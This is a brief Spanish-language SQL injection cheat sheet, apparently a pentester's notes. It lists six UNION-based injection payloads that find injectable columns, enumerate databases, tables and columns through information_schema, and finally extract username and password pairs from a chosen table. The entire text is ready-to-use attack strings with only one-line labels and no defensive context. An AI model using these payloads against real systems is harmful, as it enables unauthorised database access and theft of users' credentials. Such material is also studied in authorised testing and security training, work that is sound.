# SQLi (SQL injection)

### Inyecciones SQL básicas

1. Ver campos inyectables

`'UNION SELECT NULL,NULL-- -`

2. Para ver las bases de datos.

`'UNION SELECT schema_name,NULL FROM information_schema.schemata-- -`

3. Para ver las tablas de todas las bases de datos existentes.

`'UNION SELECT table_name,NULL FROM information_schema.tables-- -`

4. Para ver tablas de una base de datos en concreto.

`'UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = '<DB>'-- -`

5. Para ver columnas de la tabla en concreto.

`'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema = 'DB' AND table_name = '<tabla>'-- -`

6. Para ver datos de columnas de una tabla en concreto.

`'UNION SELECT NULL,username||':'||password FROM <tabla>-- -`
